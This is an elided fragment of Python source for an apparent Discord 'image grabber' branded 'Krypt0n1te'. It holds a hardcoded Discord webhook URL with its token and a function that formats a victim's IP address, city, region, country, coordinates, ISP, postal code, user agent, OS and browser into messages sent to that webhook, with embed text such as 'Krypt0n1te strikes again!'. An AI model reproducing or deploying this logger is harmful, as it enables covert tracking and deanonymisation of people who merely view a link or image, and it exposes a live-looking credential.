...
webhook = 'https://discord.com/api/webhooks/1535221567167139882/s0wjmmjirlqP_NkkwATuFH6oLg9Amq2TQcO6KvWyxRK6Si7LzE6mqL3zyZdSdXLLLdh4'
...
def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
  ...
  "embeds": [
    {
      "title": "Krypt0n1te strikes again!",
      "color": 16711803,
  ...
  "embeds": [
    {
      ...
      "color": 16711803,
      "description": f"Discord previewed a Krypt0n1te Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Krypt0n1te"
      },
      "fields": [
